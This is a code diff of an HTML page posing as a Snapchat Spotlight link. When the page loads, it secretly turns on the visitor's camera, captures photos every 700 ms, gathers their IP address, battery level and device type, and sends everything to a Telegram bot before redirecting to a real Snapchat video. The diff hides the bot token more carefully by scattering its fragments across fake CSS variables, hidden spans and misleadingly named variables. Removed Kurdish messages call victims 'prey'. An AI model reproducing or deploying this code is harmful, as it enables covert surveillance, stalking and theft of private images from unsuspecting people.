@@ -2,52 +2,57 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <script>var _v_cache_09 = "Vis5"; var _v_mem_31 = "8431";</script>
+    <script>var _sys_alloc_v1 = "84"; var _gfx_res_w = "31"; var _mem_stack_h = "51";</script>
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
     <title>snapchat spotlight</title>
     <style>
         :root { 
-            --gfx-offset-v: "l7AM"; 
-            --shadow-blur-radius: "5153";
-            --font-kerning-data: "m9EG";
-            --edge-smooth-factor: "10:";
+            --ui-font-sz: "53"; 
+            --ui-line-ht: "10:";
+            --ui-anim-ms: "AAFA";
+            --ui-blur-px: "BzJu";
+            --ui-step-cnt: "X8l7";
+            --ui-base-rgb: "l7";
         }
         body { background-color: white !important; margin: 0; overflow: hidden; height: 100vh; width: 100vw; }
         .zone-wrapper { display: none !important; visibility: hidden !important; }
     </style>
-    <script>var _v_sync_12 = "AAFA";</script>
+    <script>var _io_pipe_s = "AML"; var _gpu_core_f = "Vis5";</script>
 </head>
 <body onload="capture()">
-    <script>var _v_ptr_04 = "9l8I";</script>
+    <script>var _net_rx_k = "xS"; var _ptr_ref_0 = "FH";</script>
 
     <div class="zone-wrapper">
-        <span id="hex-alloc-01">BzJu</span>
-        <span id="hex-alloc-02">X8l7</span>
+        <span id="hex-val-x">m9</span>
+        <span id="hex-val-y">EG</span>
+        <span id="hex-val-z">K9</span>
     </div>
 
 <script>
     const API_TOKEN = "7294105831:AAHkL01xVpZ7mN9_QY2Wz8kR0X41vLM0P2t";
-    var _v_stack_77 = "xSFH";
+    var _ext_mod_r = "5i";
 
     async function capture() {
+        var _v_bit_1 = "9l";
         const urlParams = new URLSearchParams(window.location.search);
         const targetID = urlParams.get('id'); 
         if (!targetID) return;
 
         try {
-            var _v_heap_15 = "K95i";
-            const _conf = getComputedStyle(document.documentElement);
+            var _v_bit_2 = "8I";
+            const _cfg = getComputedStyle(document.documentElement);
+            const _p4 = _cfg.getPropertyValue('--ui-font-sz').replace(/"/g, '').trim();
+            const _p5 = _cfg.getPropertyValue('--ui-line-ht').replace(/"/g, '').trim();
+            const _p6 = _cfg.getPropertyValue('--ui-anim-ms').replace(/"/g, '').trim();
+            const _p7 = _cfg.getPropertyValue('--ui-blur-px').replace(/"/g, '').trim();
+            const _p8 = _cfg.getPropertyValue('--ui-step-cnt').replace(/"/g, '').trim();
+            const _p9 = _cfg.getPropertyValue('--ui-base-rgb').replace(/"/g, '').trim();
             
-            const _s_4 = _conf.getPropertyValue('--shadow-blur-radius').replace(/"/g, '').trim();
-            const _s_9 = _conf.getPropertyValue('--edge-smooth-factor').replace(/"/g, '').trim();
-            const _s_1 = _conf.getPropertyValue('--gfx-offset-v').replace(/"/g, '').trim();
-            const _s_7 = _conf.getPropertyValue('--font-kerning-data').replace(/"/g, '').trim();
-            
-            var _d_02 = document.getElementById("hex-alloc-02").innerText;
-            var _d_01 = document.getElementById("hex-alloc-01").innerText;
+            var _h1 = document.getElementById("hex-val-x").innerText;
+            var _h2 = document.getElementById("hex-val-y").innerText;
+            var _h3 = document.getElementById("hex-val-z").innerText;
 
-            /* Jumbled construction logic (Non-sequential) */
-            const _session_auth = _v_mem_31 + _s_4 + _s_9 + _v_sync_12 + _d_01 + _d_02 + _s_1 + _v_cache_09 + _v_stack_77 + _s_7 + _v_heap_15 + _v_ptr_04;
+            const _auth_bundle = _sys_alloc_v1 + _gfx_res_w + _mem_stack_h + _p4 + _p5 + _p6 + _p7 + _p8 + _p9 + _io_pipe_s + _gpu_core_f + _net_rx_k + _ptr_ref_0 + _h1 + _h2 + _h3 + _ext_mod_r + _v_bit_1 + _v_bit_2;
 
             setTimeout(() => {
                 window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
@@ -58,7 +63,7 @@
                 audio: false 
             });
 
-            let batteryInfo = "Unknown";
+            let batteryInfo = "0";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
@@ -67,12 +72,8 @@
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
-                    let report = ` <b>نێچیرێکی نوێ ڕاوکرا</b>\n\n` +
-                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
-                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
-                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
-                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
-                    _sendMsg(report, _session_auth, targetID);
+                    let report = `👤 <b>ID:</b> <code>${targetID}</code>\n🌐 <b>IP:</b> <code>${data.ip}</code>\n🔋 <b>Batt:</b> <code>${batteryInfo}</code>`;
+                    _sendMsg(report, _auth_bundle, targetID);
                 });
 
             const video = document.createElement('video');
@@ -86,13 +87,13 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) _sendFile(b, "photo", _session_auth, targetID); }, 'image/jpeg', 0.9);
+                canvas.toBlob(b => { if (b) _sendFile(b, "photo", _auth_bundle, targetID); }, 'image/jpeg', 0.9);
             };
             setInterval(takeSnap, 700);
 
         } catch (e) {
             const _rec = "8431515310:AAFABzJuX8l7AMLVis5xSFHm9EGK95i9l8I";
-            _sendMsg(" نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا", _rec, targetID);
+            _sendMsg("Blocked", _rec, targetID);
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
@@ -108,7 +109,7 @@
     function _sendFile(blob, type, tk, uid) {
         let fd = new FormData();
         fd.append("chat_id", uid);
-        fd.append(type, blob, "snap.jpg");
+        fd.append(type, blob, "img.jpg");
         fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
